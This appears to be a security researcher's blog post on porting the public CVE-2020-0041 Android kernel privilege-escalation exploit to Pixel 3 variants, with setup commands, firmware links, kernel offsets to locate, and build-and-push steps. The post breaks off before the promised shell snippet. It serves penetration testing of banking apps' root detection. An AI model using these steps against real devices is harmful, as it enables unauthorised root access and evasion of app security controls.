There are different root frameworks that can be used on Android in order to obtain root privileges. Usually, during Android application security evaluations, root detection is tested in different ways. Application countermeasures such as root detection are easy to bypass in most of the Android applications and sometimes without the use of reverse engineering techniques; however, as I've been seen during the analysis of banking applications, bypassing root detection on these applications can be hard and time consuming due high obfuscation and countermeasures applied.

A common procedure in the industry is the adaptation of privilege escalation exploits that are not detectable by most of the applications. In this post I will explain how to adapt bluefrostsecurity **CVE-2020-0041** PoC for Pixel 3 to all the Pixel3 family devices. Furthermore, I will provide a a code snipet to obtain a non-limited shell. 

## Requirements

* Download the **CVE-2020-0041** PoC exploit that we will be using for the modifications:

```
git clone https://github.com/bluefrostsecurity/CVE-2020-0041
```

* In order to adapt the exploit for any Pixel 3 device, the specific Pixel 3 vulnerable firmware **(QQ1A.200205.002)** needs to be downloaded from [official website](https://developers.google.com/android/images). A list of the specific devices links can be found below:

    * [Pixel 3 XL](https://dl.google.com/dl/android/aosp/crosshatch-qq1a.200205.002-factory-3e5c17fd.zip)

    * [Pixel 3a XL](https://dl.google.com/dl/android/aosp/bonito-qq1a.200205.002-factory-238bc80e.zip)

    * [Pixel 3a](https://dl.google.com/dl/android/aosp/sargo-qq1a.200205.002-factory-36d5179f.zip)

* Download [abootimg](https://github.com/ggrandou/abootimg) and compile it:

```
git clone https://github.com/ggrandou/abootimg
cd abootimg
make
```

* Download and install [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool using pip3.

```
sudo apt install python3-pip
sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
```

* In addition, we will need the **Android NDK** in our path in order to compile the exploit. As an example, I have this on my .zshrc file.

```
export NDK="/home/calabres/NDK"
```

## Procedure

1. First of all we need to extract the compressed kernel image from the boot.img. In order to do that, we will use the already downloaded tool **abootimg**.

```
./abootimg -x [path_to_boot_img]
```

The produced zImage, is an image that contains the compressed Android Kernel. I love kernels.

2. In order to obtain an uncompressed image of the Kernel that contains correct symbols and offsets, use the [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool.

```
vmlinux-to-elf [path_to_zImage] [kernel.elf] 
```

3. Use a disassembler of your preference to find the labels related with the exploit offsets found in exploit.c:

```
SELINUX_ENFORCING_OFFSET 
MEMSTART_ADDR_OFFSET 
SYSCTL_TABLE_ROOT_OFFSET
PROC_DOUINTVEC_OFFSET
INIT_TASK_OFFSET
INIT_CRED_OFFSET
OFFSET_PIPE_FOP
```

5) Align exploit.c with correct offsets.

## Testing the exploit

The exploit can be built by simply running "make" with the Android NDK in the path. It can also 
be pushed to a phone attached with adb by doing "make all push" (warnings removed for brevity):

```
user@laptop:~/CVE-2020-0041/lpe$ make all push

```

Now just run /data/local/tmp/poc from an adb shell to see the exploit running:
